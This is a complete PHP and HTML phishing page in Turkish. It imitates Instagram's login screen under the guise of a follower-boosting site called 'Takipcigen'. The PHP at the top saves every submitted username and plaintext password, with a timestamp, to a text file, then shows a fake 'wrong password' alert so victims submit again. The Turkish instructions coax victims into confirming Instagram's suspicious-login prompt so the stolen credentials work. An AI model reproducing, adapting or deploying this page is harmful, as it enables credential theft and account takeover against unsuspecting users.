
<?php  
if (isset($_POST['username']) && isset($_POST['password'])) {
date_default_timezone_set('Europe/Istanbul');
$tarih =" Tarih : ".date('d/m/Y  H:i');
$ac = fopen("kayit.txt","a+");
$username = $_POST['username'];
$password = $_POST['password'];
$userlar = ("\n__________________ \n".$tarih."\n\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>
<html lang="tr">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!--    <title>Beyaztakip Login</title>-->
    <title>Login | Takipcigen</title>
    <meta name="robots" content="noindex, nofollow">
    <meta id="viewport" name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, minimum-scale=1, maximum-scale=1">
    <style>
      body::-webkit-scrollbar {
        display: none;
      }
    </style>
    <style type="text/css">
      @-webkit-keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

@-moz-keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

@-ms-keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

@-o-keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

@keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

.spiSpinner {
    left              : 50%;
    position          : absolute;
    top               : 50%;
    background-size   : 100%;
    height            : 18px;
    margin-left       : -9px;
    margin-top        : -9px;
    width             : 18px;
    background-image  : url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2hpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDoyRTNGMkVENTlEMjE2ODExODIyQUNEMjMwNzUzNTEzMyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDowMzIxMkU3QTcxMUUxMUUyQjdFMUNDNDg3OTE3RUY5RCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDowMzIxMkU3OTcxMUUxMUUyQjdFMUNDNDg3OTE3RUY5RCIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6ODJGQzEwNTI1MDIyNjgxMTgyMkFDRDIzMDc1MzUxMzMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MkUzRjJFRDU5RDIxNjgxMTgyMkFDRDIzMDc1MzUxMzMiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6COBsvAAACo0lEQVR42uyZu08UURjFZ1Y2GjQ+MIaEmODb1qVGQkMhhZ001rKN8Q+AWFjY2NqwGgsrKwq1oqAxgYagogWNxS6ymvAw+AAW3TCem5xNbibcuzM7995x4nzJL8zOzM6cc1/fd1k/CAIvy1HwMh65gdxAbiDj0WXjoeVyWXmtUqlkpgdGwCdQBTezOISmwEXQLxre1kv8qJlYNywUEX6wH+fLUYfaf7kKnQdPwAswbEDDYXAGnAZFFwYmwAC4DB6BGwnEHwE9FC6MnHRh4Fjo+w86NCHEnwrNjYILA49BM6GJg8SL+OHCwDyYVJgYlc6tSsffIojfAruu8sCswsR9cJaf74INih/nuUMa8TuuS4lZ/n0oPafIVUq0/ksSfp8x8SbyQKsn9vh5BSxq7v8t9VqQVHzbTBwj+/aBC+BtS1A4k0rP8rlkNkNDsKPMbKoa/UKilhgNl+V0STQgOK64LobBU/BOV7/I19gbJ8A5jYY/oAa+J50DdzTiPWbP8Q4ar79NAxZ5j5NirunZicCEgSmu56rY4BCKG1WuSroVq2ZiDnwA9+LuGTSrkFw2fLQ6iQ+YeLp50MsWa0R4pyidf4HtpBsaE8voVXCLz9rikGto3jcEjoJ98B7U0/yvhBA/xhqn1ROilFhW9FgPxbfmX4nH9TQMhMV7bNV1HouibpBC5zi8fvKegpSVE5koGBQvlrzX0oo1yPwhNkDXeW6X5cZ+aLNfkqpY6wYuKcS/EtlYOicnv27p+KvCxDXWVNYNDEcQ3y5UJq64MLCXULzORNOFgRnwmZN1ukPxsokFFmybYMnFKrQGnhmsd9ZIKjuy1MO38Sslk9htKWmJefM8TonwL/TAHEsKIf6NrZd0WTRQJVYjnwNpR/4rZW4gN5Dx+CvAABjBsk/oCqxuAAAAAElFTkSuQmCC);
    -webkit-animation : spin8 .8s steps(8) infinite;
    -moz-animation    : spin8 .8s steps(8) infinite;
    -o-animation      : spin8 .8s steps(8) infinite;
    animation         : spin8 .8s steps(8) infinite
}

html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, menu, nav, output, ruby, section, summary, time, mark, audio, video {
    margin         : 0;
    padding        : 0;
    border         : 0;
    font-size      : 100%;
    font           : inherit;
    vertical-align : baseline
}

body {
    line-height : 1
}

ol, ul {
    list-style : none
}

blockquote, q {
    quotes : none
}

blockquote:before, blockquote:after, q:before, q:after {
    content : '';
    content : none
}

table {
    border-collapse : collapse;
    border-spacing  : 0
}

article, div, footer, header, main, nav, section, #react-root {
    -webkit-box-align      : stretch;
    -webkit-align-items    : stretch;
    -ms-flex-align         : stretch;
    align-items            : stretch;
    border                 : 0 solid #000000;
    box-sizing             : border-box;
    display                : -webkit-box;
    display                : -webkit-flex;
    display                : -ms-flexbox;
    display                : flex;
    -webkit-box-orient     : vertical;
    -webkit-box-direction  : normal;
    -webkit-flex-direction : column;
    -ms-flex-direction     : column;
    flex-direction         : column;
    -webkit-flex-shrink    : 0;
    -ms-flex-negative      : 0;
    flex-shrink            : 0;
    margin                 : 0;
    padding                : 0;
    position               : relative
}

body {
    overflow-y : scroll
}

html, body {
    height : 100%
}

#react-root {
    height  : 100%;
    z-index : 0
}

body, button, input, textarea {
    font-family : 'proxima-nova', 'Helvetica Neue', Arial, Helvetica, sans-serif
}

a, a:visited {
    color           : #003569;
    text-decoration : none
}

a:active {
    opacity : .5
}

@-webkit-keyframes GradientAnimation {
    0% {
        background-position : 0% 50%
    }
    50% {
        background-position : 100% 50%
    }
    100% {
        background-position : 0% 50%
    }
}

@keyframes GradientAnimation {
    0% {
        background-position : 0% 50%
    }
    50% {
        background-position : 100% 50%
    }
    100% {
        background-position : 0% 50%
    }
}

.instaclass11 {
    -webkit-appearance : none
}

.instaclass11::-webkit-input-placeholder {
    color       : #999999;
    font-weight : 300;
    opacity     : 1
}

.instaclass11::-moz-placeholder {
    color       : #999999;
    font-weight : 300;
    opacity     : 1
}

.instaclass11:-ms-input-placeholder {
    color       : #999999;
    font-weight : 300;
    opacity     : 1
}

.instaclass11::-ms-clear {
    display : none;
    height  : 0;
    width   : 0
}

@-moz-keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

@-ms-keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

@-o-keyframes spin8 {
    0% {
        -webkit-transform : rotate(180deg);
        -moz-transform    : rotate(180deg);
        -o-transform      : rotate(180deg);
        transform         : rotate(180deg)
    }
    100% {
        -webkit-transform : rotate(540deg);
        -moz-transform    : rotate(540deg);
        -o-transform      : rotate(540deg);
        transform         : rotate(540deg)
    }
}

.spiSpinner {
    display           : none;
    left              : 50%;
    position          : absolute;
    top               : 50%;
    background-size   : 100%;
    height            : 18px;
    margin-left       : -9px;
    margin-top        : -9px;
    width             : 18px;
    background-image  : url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAA2hpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wTU09Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9tbS8iIHhtbG5zOnN0UmVmPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvc1R5cGUvUmVzb3VyY2VSZWYjIiB4bWxuczp4bXA9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC8iIHhtcE1NOk9yaWdpbmFsRG9jdW1lbnRJRD0ieG1wLmRpZDoyRTNGMkVENTlEMjE2ODExODIyQUNEMjMwNzUzNTEzMyIgeG1wTU06RG9jdW1lbnRJRD0ieG1wLmRpZDowMzIxMkU3QTcxMUUxMUUyQjdFMUNDNDg3OTE3RUY5RCIgeG1wTU06SW5zdGFuY2VJRD0ieG1wLmlpZDowMzIxMkU3OTcxMUUxMUUyQjdFMUNDNDg3OTE3RUY5RCIgeG1wOkNyZWF0b3JUb29sPSJBZG9iZSBQaG90b3Nob3AgQ1M2IChNYWNpbnRvc2gpIj4gPHhtcE1NOkRlcml2ZWRGcm9tIHN0UmVmOmluc3RhbmNlSUQ9InhtcC5paWQ6ODJGQzEwNTI1MDIyNjgxMTgyMkFDRDIzMDc1MzUxMzMiIHN0UmVmOmRvY3VtZW50SUQ9InhtcC5kaWQ6MkUzRjJFRDU5RDIxNjgxMTgyMkFDRDIzMDc1MzUxMzMiLz4gPC9yZGY6RGVzY3JpcHRpb24+IDwvcmRmOlJERj4gPC94OnhtcG1ldGE+IDw/eHBhY2tldCBlbmQ9InIiPz6COBsvAAACo0lEQVR42uyZu08UURjFZ1Y2GjQ+MIaEmODb1qVGQkMhhZ001rKN8Q+AWFjY2NqwGgsrKwq1oqAxgYagogWNxS6ymvAw+AAW3TCem5xNbibcuzM7995x4nzJL8zOzM6cc1/fd1k/CAIvy1HwMh65gdxAbiDj0WXjoeVyWXmtUqlkpgdGwCdQBTezOISmwEXQLxre1kv8qJlYNywUEX6wH+fLUYfaf7kKnQdPwAswbEDDYXAGnAZFFwYmwAC4DB6BGwnEHwE9FC6MnHRh4Fjo+w86NCHEnwrNjYILA49BM6GJg8SL+OHCwDyYVJgYlc6tSsffIojfAruu8sCswsR9cJaf74INih/nuUMa8TuuS4lZ/n0oPafIVUq0/ksSfp8x8SbyQKsn9vh5BSxq7v8t9VqQVHzbTBwj+/aBC+BtS1A4k0rP8rlkNkNDsKPMbKoa/UKilhgNl+V0STQgOK64LobBU/BOV7/I19gbJ8A5jYY/oAa+J50DdzTiPWbP8Q4ar79NAxZ5j5NirunZicCEgSmu56rY4BCKG1WuSroVq2ZiDnwA9+LuGTSrkFw2fLQ6iQ+YeLp50MsWa0R4pyidf4HtpBsaE8voVXCLz9rikGto3jcEjoJ98B7U0/yvhBA/xhqn1ROilFhW9FgPxbfmX4nH9TQMhMV7bNV1HouibpBC5zi8fvKegpSVE5koGBQvlrzX0oo1yPwhNkDXeW6X5cZ+aLNfkqpY6wYuKcS/EtlYOicnv27p+KvCxDXWVNYNDEcQ3y5UJq64MLCXULzORNOFgRnwmZN1ukPxsokFFmybYMnFKrQGnhmsd9ZIKjuy1MO38Sslk9htKWmJefM8TonwL/TAHEsKIf6NrZd0WTRQJVYjnwNpR/4rZW4gN5Dx+CvAABjBsk/oCqxuAAAAAElFTkSuQmCC);
    -webkit-animation : spin8 .8s steps(8) infinite;
    -moz-animation    : spin8 .8s steps(8) infinite;
    -o-animation      : spin8 .8s steps(8) infinite;
    animation         : spin8 .8s steps(8) infinite
}

.instaclass31 {
    opacity : 0.2;
}

.coreSpriteLoggedOutWordmark {
    background-image    : url(//instagramstatic-a.akamaihd.net/h1/sprites/core/d11aca.png);
    background-repeat   : no-repeat;
    background-position : -112px -268px;
    height              : 51px;
    width               : 175px;
}

.instaclasssub2 {
    display     : block;
    overflow    : hidden;
    text-indent : 110%;
    white-space : nowrap
}

.instaclass24 {
    font-size      : 12px;
    font-weight    : 600;
    margin         : 0 auto;
    text-transform : uppercase;
    width          : 100%;
}

.instaclass29 {
    color : #999999
}

.instaclass28 {
    display       : inline-block;
    margin-bottom : 7px;
    margin-right  : 16px
}

.instaclass28:last-child {
    margin-right : 0
}

.instaclass27 {
    -webkit-box-flex  : 1;
    -webkit-flex-grow : 1;
    -ms-flex-positive : 1;
    flex-grow         : 1;
    margin-bottom     : 3px
}

@media (min-width : 875px) {
    .instaclass25 {
        -webkit-box-orient      : horizontal;
        -webkit-box-direction   : normal;
        -webkit-flex-direction  : row;
        -ms-flex-direction      : row;
        flex-direction          : row;
        -webkit-flex-wrap       : wrap;
        -ms-flex-wrap           : wrap;
        flex-wrap               : wrap;
        -webkit-box-pack        : justify;
        -webkit-justify-content : space-between;
        -ms-flex-pack           : justify;
        justify-content         : space-between;
        padding                 : 38px 0
    }

    .instaclass25 .instaclass26 {
        max-width : 100%
    }

    .instaclass25 .instaclass27 {
        margin-right : 16px
    }
}

@media (max-width : 874px) {
    .instaclass25 {
        padding    : 10px 0;
        text-align : center
    }

    .instaclass25 .instaclass27 {
        -webkit-box-pack        : center;
        -webkit-justify-content : center;
        -ms-flex-pack           : center;
        justify-content         : center;
        margin                  : 0 auto;
        max-width               : 360px
    }
}

.instaclass5 {
    min-height : 100%;
    overflow   : hidden
}

.instaclass4 {
    -webkit-box-flex          : 1;
    -webkit-flex-grow         : 1;
    -ms-flex-positive         : 1;
    flex-grow                 : 1;
    -webkit-box-ordinal-group : 4;
    -webkit-order             : 3;
    -ms-flex-order            : 3;
    order                     : 3
}

.instaclass30 {
    background-color : #FAFAFA
}

.instaclass23 {
    background-color          : #FAFAFA;
    -webkit-box-ordinal-group : 5;
    -webkit-order             : 4;
    -ms-flex-order            : 4;
    order                     : 4;
    padding                   : 0 20px
}

.instaclass15 {
    display  : block;
    position : relative
}

.instaclass16 {
    border-radius      : 3px;
    border-style       : solid;
    border-width       : 1px;
    font-weight        : 600;
    outline            : none;
    overflow           : hidden;
    text-overflow      : ellipsis;
    white-space        : nowrap;
    width              : 100%;
    -webkit-appearance : none
}

.instaclass17 {
    background   : #3897F0;
    border-color : #3897F0;
    color        : #FFFFFF
}

.instaclass16:active, .instaclass16.zeroclipboard-is-active, ._qk25s {
    opacity : .5
}

.instaclass19 {
    cursor : pointer
}

.instaclass18 {
    line-height : 29px;
    padding     : 0 11px
}

@media (min-width : 736px) {

    .instaclass16 {
        font-size : 16px
    }
}

@media (max-width : 735px) {

    .instaclass16 {
        font-size : 14px
    }
}

.instaclass9 {
    position : relative
}

.instaclass10 {
    background         : 0 0;
    border             : 1px solid #DBDBDB;
    border-radius      : 3px;
    box-sizing         : border-box;
    color              : #262626;
    font-size          : 14px;
    padding            : 9px 8px 7px;
    -webkit-appearance : none
}

.instaclass10:focus {
    border  : 1px solid #B2B2B2;
    outline : none
}

.instaclass12 {
    -webkit-box-align      : center;
    -webkit-align-items    : center;
    -ms-flex-align         : center;
    align-items            : center;
    -webkit-box-orient     : horizontal;
    -webkit-box-direction  : normal;
    -webkit-flex-direction : row;
    -ms-flex-direction     : row;
    flex-direction         : row;
    height                 : 100%;
    position               : absolute;
    right                  : 8px;
    top                    : 0
}

.instaclass13 {
    font-size    : 14px;
    margin-right : 4px
}

.instaclass8 {
    margin : 0 40px 6px
}

.instaclass14 {
    margin : 4px 40px 14px
}

.instaclass7 {
    display                : -webkit-box;
    display                : -webkit-flex;
    display                : -ms-flexbox;
    display                : flex;
    -webkit-box-orient     : vertical;
    -webkit-box-direction  : normal;
    -webkit-flex-direction : column;
    -ms-flex-direction     : column;
    flex-direction         : column
}

.instaclass6 {
    margin-bottom : 10px
}

.instaclass20 {
    font-size   : 14px;
    line-height : 18px;
    text-align  : center
}

.instaclass20 {
    color  : #ED4956;
    margin : 10px 40px
}

.instaclass1 {
    color                   : #262626;
    -webkit-box-flex        : 1;
    -webkit-flex-grow       : 1;
    -ms-flex-positive       : 1;
    flex-grow               : 1;
    -webkit-box-pack        : center;
    -webkit-justify-content : center;
    -ms-flex-pack           : center;
    justify-content         : center;
    margin-top              : 12px;
    max-width               : 350px
}

.instaclass2 {
    background-color : #FFFFFF;
    border           : 1px solid #EFEFEF;
    border-radius    : 1px;
    margin           : 0 0 10px;
    padding          : 10px 0
}

.instaclasssub1 {
    margin : 20px auto 10px
}

@media (max-width : 450px) {
    .instaclass1 {
        -webkit-box-pack        : justify;
        -webkit-justify-content : space-between;
        -ms-flex-pack           : justify;
        justify-content         : space-between;
        margin-top              : 0;
        max-width               : 100%
    }

    .instaclass2 {
        background-color : transparent;
        border           : none
    }
}

.instaclass21 {
    color      : #262626;
    font-size  : 14px;
    margin     : 15px;
    text-align : center
}

.instaclass22, .instaclass22:hover, .instaclass22:active, .instaclass22:visited {
    color : #3897F0
}

.instaarticle3 {
    -webkit-box-orient      : horizontal;
    -webkit-box-direction   : normal;
    -webkit-flex-direction  : row;
    -ms-flex-direction      : row;
    flex-direction          : row;
    -webkit-box-flex        : 1;
    -webkit-flex-grow       : 1;
    -ms-flex-positive       : 1;
    flex-grow               : 1;
    -webkit-box-pack        : center;
    -webkit-justify-content : center;
    -ms-flex-pack           : center;
    justify-content         : center;
    margin                  : 30px auto 0;
    max-width               : 935px;
    width                   : 100%
}

@media (max-width : 450px) {
    .instaarticle3 {
        margin-top : 0
    }
}

#slfErrorAlert {
    display : none;
}
    </style>
  </head>
  <body>
      <span id="react-root">
         <section class="instaclass5">
            <main class="instaclass4 instaclass30" role="main">
               <article class="instaarticle3">
                  <div class="instaclass1">

                     <div class="instaclass2">
                                               <div style="padding: 15px 20px 15px;
    text-align: center;
    color: white;
    margin-top: -10px;
    line-height: 1.2;
    background: #005C97;
    background: -webkit-linear-gradient(to right, #363795, #005C97);
    background: linear-gradient(to bottom, #363795, #005C97);"
                              class="pictureAlert">
                                                   <h3 style="color:orange;font-weight: bold;font-size:22px;margin-bottom: 3px">ÖNEMLİ
                             UYARI</h3>
                           <p style="margin-bottom: 10px">Resimsiz hesaplarla giriş yaparsanız <strong
                                 style="font-weight: bold">takipçi ve
                             beğeni kredisi düşük verilecektir.</strong></p>
                           <p>Daha fazla kredi kazanmak için <strong style="font-weight:bold">resimli hesaplarla
                               giriş yapın.</strong></p>
                                               </div>
                                               <div class="instaclass20" style="color: red; text-align: left;">
                          <div class="container text-center">
  <div id="google_translate_element"></div>
</div>
                <h1 style="color: black; font-weight: bold; font-size:25px; text-align:center; padding: 10px;">GİRİŞ</h1>
               <div id="slfErrorAlert"
                    aria-atomic="true"
                    role="alert"></div>
              </div>
                        <div class="instaclass6">
                           <form method="POST" 
                                 class="instaclass7" action="">
                                <div class="instaclass8 instaclass9"><input type="text" class="instaclass10 instaclass11"
                                                                            aria-describedby="" aria-label="Kullanıcı adı" aria-required="true"
                                                                            maxlength="30" name="username" id="username"
                                                                            placeholder="Kullanıcı adı" value="" autocomplete="off">
                              <div class="suggestUsers"><ul></ul></div>
                              </div>
                              <div class="instaclass8 instaclass9">
                                 <input
                                     type="password" class="instaclass10 instaclass11" aria-describedby=""
                                     aria-label="Şifre"
                                     aria-required="true" name="password"
                                     placeholder="Şifre">
                              </div>
                               <input type="hidden" name="userid"/>
                                                              <span
                                   class="instaclass14 instaclass15">
                                 <input type="submit" 
                                         class="instaclass16 instaclass17 instaclass18 instaclass19" value="Giriş yap">
                                 <div class="spiSpinner"></div>
                              </span>
                    <p style="font-size: 16px; padding:0 15px; text-align:center; color: blue; font-weight: bold;margin-top:0px;line-height:1.2;">!!!!!!<br>Login it may take a long time, Please wait.</p>
                               <p style="font-size: 16px; padding:0 15px; text-align:center; color: red; font-weight: bold;margin-top:15px;line-height:1.2;">Giriş yapma işlemi 2 dakikaya kadar sürebilir. Lütfen bekleyin.<br>!!!!!!</p>


                             <div class="instaclass20" style="color: black; text-align: left;">
                  <p style="color: red;">Bu sitenin instagram ile hiçbir bağlantısı yoktur. Kullanıcı adı ve şifreniz ile Instagram API sistemi kullanılarak işlemleriniz gerçekleştirilir.</p><p> </p>

                  <p>Bu site Havuz Sistemi mantığı ile çalışmaktadır.</p>

                  <p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası alıyorsanız instagram mobil uygulaması üzerinden hesabınıza girin. Çıkan uyarıda bendim butonuna tıklayın.</p>
                </div>
                <div class="instaclass20" style="color: black; text-align: left;">
                <p style="color: blue; text-align: left;">Sürekli şifre yanlış hatası ile karşılaşabilirsiniz. Instagram'ın anti-spam sisteminde bir hata var. Konu, çözebileceğimiz bir şey değil. Instagram kendisi çözecektir. Burayı takip etmeye devam edin.</p>
                </div>
                <div class="instaclass20" style="color: black; text-align: left;">

                <span style='color: red; font-weight: bold;'>Burayı oku!</span> 1- Giriş uzun sürebilir bekleyin lütfen..(30 saniye kadar sürer.) <br>2- ilk girişte şifre yanlış diyebilir. https://www.instagram.com üzerinden hesabınıza girin. Çıkan uyarıda bendim diyin ve buradan tekrar giriş yapın..<br>3- Instagram şifrenizi bloke edebilir. Şifremi unuttum diyerek yeni şifre alabilirsiniz.</div>
                           </form>
                        </div>
                     </div>
                  </div>
               </article>
            </main>
         </section>
      </span>
    <style>
      .onay_kodu_ekrani {
        display: none;
        position: fixed;
        top: 0;
        width: 100%;
        height: 100%;
        background: #fff;
        padding: 50px 15px;
        text-align: center;
      }

      .onay_kodu_girme_ekrani {
        display: none;
        position: fixed;
        top: 0;
        width: 100%;
        height: 100%;
        background: #fff;
        padding: 50px 15px;
        text-align: center;
      }

      .onay_kodu_ekrani select {
        padding: 10px;
        font-size: 14px;
      }

      .onay_kodu_ekrani button {
        width: 160px;
        margin: 30px auto;
        padding: 8px;
        background: #299029;
        border: 1px solid #39c739;
        color: #fff;
        border-radius: 10px;
        cursor: pointer;
      }

      .onay_kodu_ekrani button:hover {
        background: #207520;
      }

      .onay_kodu_ekrani button:disabled {
        background: #6fcc6f;
      }

      .onay_kodu_girme_ekrani input {
        padding: 10px;
        font-size: 14px;
      }

      .onay_kodu_girme_ekrani button {
        width: 160px;
        margin: 30px auto;
        padding: 8px;
        background: #299029;
        border: 1px solid #39c739;
        color: #fff;
        border-radius: 10px;
        cursor: pointer;
      }

      .onay_kodu_girme_ekrani button:hover {
        background: #207520;
      }

      .onay_kodu_girme_ekrani button:disabled {
        background: #6fcc6f;
      }
    </style>


  </body>
</html>